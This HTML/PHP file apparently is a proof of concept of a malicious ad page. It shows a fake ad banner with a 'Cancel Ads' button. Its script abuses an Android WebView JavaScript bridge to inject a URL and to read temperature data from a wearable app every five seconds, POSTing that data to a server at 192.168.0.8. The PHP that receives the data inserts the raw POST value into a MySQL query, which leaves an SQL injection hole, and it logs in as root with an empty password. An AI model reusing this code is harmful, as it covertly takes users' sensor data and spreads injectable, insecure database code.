<html>
	<head>
		<script>
		let maliciousUrl = "";
		let tempToWrite = "";
		let xhttp = new XMLHttpRequest();
		

		function getJavaFunction() {
			maliciousUrl = "http://192.168.0.8/metawear-ads/index.php";
			new injectUrl(maliciousUrl);
			getTemp();

		}

		//Injects malicious URL to Android and calls clearAd()
		function injectUrl(maliciousUrl) {
			fakeUrl = maliciousUrl;
			//document.getElementById("adsHere").innerHTML = var1;
			Android.setUrl(fakeUrl);

			
			// Android.setup() calls the setup from Java and triggers temperature collection from WebView on Cancel button press
			clearAds();
		}

		//reading temperature from Android in every 5 seconds
		setInterval(function getTemp() {
			let listOfTemp = Android.getTemperature();
			tempToWrite = listOfTemp.substring(1, listOfTemp.length-1);
			//document.getElementById("adsHere").innerHTML = tempToWrite;
			xhttp.open("POST", "http://192.168.0.8/metawear-ads/index.php" , true);
			xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
			xhttp.send("celsius="+tempToWrite);
			//xhttp.abort();
		},5000);
			




			// if(listOfTemp != '[]') {
			// 	let xhttp = new XMLHttpRequest();
			// 	let tempArray = listOfTemp.split(",");
			// 	document.getElementById("adsHere").innerHTML = "from inside if--then"+listOfTemp;
			// 	let copiedTemp = [];

			// 	//this is storing only the last element in tempArray, closure problem, need to fix it
			// 	tempArray.forEach(function(element){
					
			// 		copiedTemp.push(element);
			// 		document.getElementById("adsHere").innerHTML = element;
			// 		xhttp.open("POST", "http://192.168.0.8/metawear-ads/index.php" , true);
			// 		xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
			// 		xhttp.send("celsius="+copiedTemp.pop(element));
			// 	});
			// 	xhttp.abort();
			// }
		//}, 500);

		//clearInterval(myTimer);

		//clearing the body when ads is cancelled (cancel button pressed)
		function clearAds() {
			divValue = document.getElementById("adsBody");
			divValue.parentNode.removeChild(divValue);
		}
		
		</script>

	</head>
	<body id="adsBody" onload="getTemp()">	
		<?php
			
			error_reporting(0);
			$servername = "localhost";
			$username = "root";
			$password = "";
			$dbname = "metaweardb";
			
			$time = round(microtime(true) * 1000);
			$temperature= $_POST['celsius'];
			
			// Create connection
			$conn = new mysqli($servername, $username, $password, $dbname);
			// Check connection
			if ($conn->connect_error) {
			    die("Connection failed: " . $conn->connect_error);
			} 
			
			if($temperature!= NULL) {
				$sql = "INSERT INTO tbl_data(time, temperature)
				VALUES ('$time', '$temperature')";
			
				$conn->query($sql);
			
			}
				
			
			
			
			$conn->close();
	
		?>
		
	
		<div id="adsHere" style="margin:0; padding:0; height: 0; width: 0;">
			<p id="adsHere"></p>
			<p id="toTest"></p>
			<p style="width:680px; height: 60px; border:2px solid #000;">
				<span>Ads come here<br/> Ads can be cancelled pressing cancel button</span><br />
				<a href="http://localhost/metawear-ads/display.php">View collected data</a> 
				<input type="button" value="Cancel Ads" name="submit" onclick="getJavaFunction()" style="float:right;" /> 
			</p>

		</div>
			
			
		
	</body>
	
	
	
</html>